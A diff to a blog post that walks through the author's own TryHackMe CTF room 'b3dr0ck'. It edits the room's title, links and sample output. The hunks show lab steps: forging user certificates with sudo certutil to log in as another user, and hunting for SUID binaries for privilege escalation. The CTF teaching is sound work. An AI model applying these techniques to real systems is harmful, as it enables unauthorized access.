@@ -1,6 +1,6 @@
 ---
 layout: post
-title: 'b3dr0ck (v2) - {THM} Room'
+title: 'b3dr0ck - {THM} Room'
 description: >-
   Created my first CTF room on TryHackMe! Gain access to the ABC servers, using
   lightweight custom TCP/TLS/HTTPS services. Learn about TLS certificate
@@ -23,6 +23,8 @@ categories:
   - ssl
 
 ---
+<h3>Join room here: <a title="Join this room!" href="https://tryhackme.com/jr/b3dr0ckvc" target="_blank" rel="noopener">tryhackme.com/jr/b3dr0ckvc</a></h3>
+<p>Signup for TryHackMe today! <a title="Try Hack Me Homepage" href="https://tryhackme.com/" target="_blank" rel="noopener">tryhackme.com</a></p>
 <p><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1650051940425-BqXFc-1565710625-263-show-flintstones_header_940x370 (1).jpg" alt="Fred &amp; Barney" width="766" height="300" /></p>
 <h3>Context (THM Task)</h3>
 <p>Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble ...</p>
@@ -167,12 +169,12 @@ b3dr0ck&gt; </pre>
 <li>What can we access here?</li>
 <li>
 <pre>b3dr0ck&gt; whoami
-Current user = 'barney' (Barney Rubble peer certificate)
+Current user = 'Barney Rubble' (valid peer certificate)
 b3dr0ck&gt; ls
 Unrecognized command: 'ls'
 
 This service is for login and password hints<br />b3dr0ck&gt; help
-Password hint: ******************************** (user = 'barney')
+Password hint: ******************************** (user = 'Barney Rubble')
 </pre>
 </li>
 <li>
@@ -194,24 +196,7 @@ ECDSA key fingerprint is SHA256:wQ21BG+EOKJCF/4/7AIY9n8e86E7MAN2gH/J/+koWk4.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '${VMIP}' (ECDSA) to the list of known hosts.
 barney@${VMIP}'s password: 
-Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sun 10 Apr 2022 11:10:22 PM UTC
-
-  System load:  0.0               Processes:             114
-  Usage of /:   57.0% of 7.07GB   Users logged in:       0
-  Memory usage: 23%               IPv4 address for eth0: ${VMIP}
-  Swap usage:   0%
-
-
-0 updates can be applied immediately.
-
-
-Last login: Sun Apr 10 21:02:13 2022 from 192.168.1.67
 barney@b3dr0ck:~$</pre>
 </li>
 <li>
@@ -333,10 +318,10 @@ drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
 
 Welcome: 'F11snipe FTW' is authorized.
 b3dr0ck> help
-Password hint: ******************************** (user = 'barney')
+Password hint: none (user = 'F11snipe FTW')
 b3dr0ck> 
 </pre></li>
-<li>Yay, We're in with our new credentials! But it looks like the hint is repeated (same as barney)</li>
+<li>Yay, We're in with our new credentials! But it looks like the hint is empty (new user)</li>
 <li>Let's see if we can get here as user <strong>fred</strong></li>
 <li>Back to <strong>certutil</strong>, let's try to overwrite fred's credentials with new ones we have access to</li>
 <li><pre>barney@b3dr0ck:~$ sudo certutil fred "Fred Flintstone"
@@ -376,8 +361,7 @@ Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
 
 Welcome: 'Fred Flintstone' is authorized.
 b3dr0ck> help
-Password hint: ****************
- (user = 'fred')
+Password hint: **************** (user = 'Fred Flintstone')
 b3dr0ck> 
 </pre></li>
 
@@ -405,30 +389,6 @@ THM{***}</pre>
 <li>Start searching for&nbsp;<strong>SUID</strong> files</li>
 <li>
 <pre>fred@b3dr0ck:~$ find / -type f -perm -04000 2&gt;/dev/null
-/snap/snapd/14978/usr/lib/snapd/snap-confine
-/snap/snapd/15177/usr/lib/snapd/snap-confine
-/snap/core20/1405/usr/bin/chfn
-/snap/core20/1405/usr/bin/chsh
-/snap/core20/1405/usr/bin/gpasswd
-/snap/core20/1405/usr/bin/mount
-/snap/core20/1405/usr/bin/newgrp
-/snap/core20/1405/usr/bin/passwd
-/snap/core20/1405/usr/bin/su
-/snap/core20/1405/usr/bin/sudo
-/snap/core20/1405/usr/bin/umount
-/snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core20/1405/usr/lib/openssh/ssh-keysign
-/snap/core20/1328/usr/bin/chfn
-/snap/core20/1328/usr/bin/chsh
-/snap/core20/1328/usr/bin/gpasswd
-/snap/core20/1328/usr/bin/mount
-/snap/core20/1328/usr/bin/newgrp
-/snap/core20/1328/usr/bin/passwd
-/snap/core20/1328/usr/bin/su
-/snap/core20/1328/usr/bin/sudo
-/snap/core20/1328/usr/bin/umount
-/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core20/1328/usr/lib/openssh/ssh-keysign
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/policykit-1/polkit-agent-helper-1
